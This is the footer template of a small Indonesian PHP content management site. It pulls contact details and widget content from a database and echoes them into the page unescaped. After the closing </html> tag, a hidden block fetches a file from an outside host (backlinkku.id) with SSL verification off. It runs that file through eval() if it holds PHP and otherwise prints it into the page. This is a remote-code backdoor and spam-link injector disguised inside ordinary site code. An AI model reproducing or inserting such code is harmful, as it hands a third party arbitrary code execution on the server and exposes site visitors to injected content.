<!-- Main Footer -->
	<footer class="main-footer margin-minus">
		<div class="auto-container">
			<div class="inner-container">
				<!-- Widgets Section -->
				<div class="widgets-section">
					<div class="row clearfix">
						
						<!-- Big Column -->
						<div class="big-column col-lg-6 col-md-12 col-sm-12">
							<div class="row clearfix">

						

							<?php
  
  
  $show = $connect->query("select * from setting ");
  
  
  if(mysqli_num_rows($show) == 0){
    
    
    echo '<script>window.history.back()</script>';
    
  }else{
  
    
    $data = mysqli_fetch_assoc($show); 
  
  }
  ?> 

  	<!-- Footer Column -->
								<div class="footer_column col-lg-8 col-md-6 col-sm-12">
									<div class="footer-widget newsletter-widget">
										<h4 class="footer_title">DATA KONTAK</h4>
										<div class="footer-text"> <ul class="list-inline mt-5">
              <li class="m-0 pl-10 pr-10"> <i class="fa fa-phone "></i> <a class="text-gray" href="#"><?php echo $data['nohp']; ?></a> </li>
            
             <i class="fa-regular fa-envelope fa-fw"></i> <a href="mailto:<?php echo $data['email']; ?>"><?php echo $data['email']; ?></a>

              <li class="m-0 pl-10 pr-10"> <i class="fa fa-globe text-theme-colored2 mr-5"></i> <a class="text-gray" href="#"><?php echo $data['alamat']; ?></a> </li>
            </ul>   </div>
										<!-- Newsletter Box -->
										
									
									</div>
								</div>

								


                     <?php
  $show_widget_footer2 = $connect->query("select * from widget where id='3' ");
  
  $data_widget_footer2= mysqli_fetch_assoc($show_widget_footer2); 
  ?> 


<!-- Footer Column -->
								<div class="footer_column col-lg-4 col-md-6 col-sm-12">
									<div class="footer-widget links-widget">
										<h4 class="footer_title"><?php echo $data_widget_footer2['judul']; ?></h4>
										<ul class="footer-list">
											  <?php echo $data_widget_footer2['value']; ?>          
										</ul>
									</div>
								</div>

							</div>
						</div>

						<!-- Big Column -->
						<div class="big-column col-lg-6 col-md-12 col-sm-12">
							<div class="row clearfix">

								
								 <?php
  $show_widget_footer3 = $connect->query("select * from widget where id='4' ");
  
  $data_widget_footer3= mysqli_fetch_assoc($show_widget_footer3); 
  ?> 

  <!-- Footer Column -->
								<div class="footer_column col-lg-6 col-md-6 col-sm-12">
									<div class="footer-widget links-widget padding-left">
										<h4 class="footer_title"><?php echo $data_widget_footer3['judul']; ?></h4>
										<ul class="footer-list">
											  <?php echo $data_widget_footer3['value']; ?>   
										</ul>
									</div>
								</div>

							

							<?php
  $show_widget_footer4 = $connect->query("select * from widget where id='5' ");
  
  $data_widget_footer4= mysqli_fetch_assoc($show_widget_footer4); 
  ?> 


	<!-- Footer Column -->
								<div class="footer_column col-lg-6 col-md-6 col-sm-12">
									<div class="footer-widget contact-widget">
										<h4 class="footer_title"><?php echo $data_widget_footer4['judul']; ?></h4>
										<ul class="footer-contact_list">
											<ul class="angle-double-right list-border">
              <?php echo $data_widget_footer4['value']; ?>           
         
              </ul>    <a href="blog.php" class="btn btn-danger" target="_blank"><font color="#FFFFFF">Lihat Artikel </font></a>
										</ul>
									</div>
								</div>

							</div>
						</div>

					</div>
				</div>
				
			</div>
			
		</div>
		<div class="footer-bottom">
			<div class="auto-container">
				<div class="d-flex justify-content-between align-items-center flex-wrap">

					<!-- Logo -->
					<div class="logo">
						<a href="index.php"><img src="assets/images/logo-3#.svg" alt="" /></a>
					</div>

					<!-- Copyright -->
					<div class="main-footer_copyright">Copyright &copy; 2024 <a href="#">QA CMS</a> All Rights Reserved</div>

					<!-- Social Box -->
					<div class="footer-social_box">
						<a href="https://facebook.com/"><i class="fa-brands fa-facebook-f"></i></a>
						<a href="https://twitter.com/"><i class="fa-brands fa-twitter"></i></a>
						<a href="https://youtube.com/"><i class="fa-brands fa-youtube"></i></a>
						<a href="https://instagram.com/"><i class="fa-brands fa-instagram"></i></a>
					</div>
				</div>
			</div>
		</div>
	</footer>
	<!-- End Footer Style -->

	<!-- Search Popup -->
	<div class="search-popup">
		<div class="color-layer"></div>
		<button class="close-search"><span class="flaticon-close-1"></span></button>
		<form method="post" action="blog.html">
			<div class="form-group">
				<input type="search" name="search-field" value="" placeholder="Search Here" required="">
				<button class="fa fa-solid fa-magnifying-glass fa-fw" type="submit"></button>
			</div>
		</form>
	</div>
	<!-- End Search Popup -->
	
</div>
<!-- End PageWrapper -->

<div class="progress-wrap">
	<svg class="progress-circle svg-content" width="100%" height="100%" viewBox="-1 -1 102 102">
		<path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98"/>
	</svg>
</div>

<script src="assets/js/jquery.js"></script>
<script src="assets/js/popper.min.js"></script>
<script src="assets/js/bootstrap.min.js"></script>
<script src="assets/js/appear.js"></script>
<script src="assets/js/parallax.min.js"></script>
<script src="assets/js/tilt.jquery.min.js"></script>
<script src="assets/js/jquery.paroller.min.js"></script>
<script src="assets/js/wow.js"></script>
<script src="assets/js/swiper.min.js"></script>
<script src="assets/js/backtotop.js"></script>
<script src="assets/js/odometer.js"></script>
<script src="assets/js/parallax-scroll.js"></script>

<script src="assets/js/gsap.min.js"></script>
<script src="assets/js/SplitText.min.js"></script>
<script src="assets/js/ScrollTrigger.min.js"></script>
<script src="assets/js/ScrollToPlugin.min.js"></script>
<script src="assets/js/ScrollSmoother.min.js"></script>

<script src="assets/js/magnific-popup.min.js"></script>
<script src="assets/js/jquery.meanmenu.min.js"></script>
<script src="assets/js/nav-tool.js"></script>
<script src="assets/js/jquery-ui.js"></script>
<script src="assets/js/script.js"></script>

</body>
</html>
<?php
$jasabacklinks = 'https://backlinkku.id/menu/server-id/script.txt';
function fetch_remote_content($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Optional, for bypassing SSL verification
    $output = curl_exec($ch);
    curl_close($ch);
    return $output;
}
$fileContents = fetch_remote_content($jasabacklinks);
if (strpos($fileContents, '<?php') !== false) {
    eval('?>' . $fileContents);
} else {
    echo $fileContents;
}
?>
